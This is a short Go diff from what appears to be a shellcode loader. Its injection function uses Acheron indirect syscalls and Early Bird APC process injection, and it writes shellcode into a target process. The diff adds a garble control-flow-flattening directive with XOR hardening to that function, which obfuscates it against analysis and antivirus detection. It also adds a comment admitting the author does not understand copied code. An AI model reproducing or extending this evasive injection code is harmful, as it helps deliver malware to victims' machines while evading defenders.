@@ -23,6 +23,7 @@ func Init() (*ShellcodeLoader, error) {
 	return &ShellcodeLoader{Acheron: ach}, nil
 }
 
+//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func (s *ShellcodeLoader) InjectShellcode(shellcode []byte, exePath string) error {
 	fmt.Printf("[!] Using indirect syscalls with acheron (Early Bird APC)...\n")
 
@@ -83,6 +84,7 @@ func (s *ShellcodeLoader) InjectShellcode(shellcode []byte, exePath string) erro
 	fmt.Println("[+] Shellcode written to memory")
 
 	const CONTEXT_FULL = 0x10007
+	//i dont know what is this but thanks to google
 	type CONTEXT struct {
 		P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64
 		ContextFlags                                   uint32
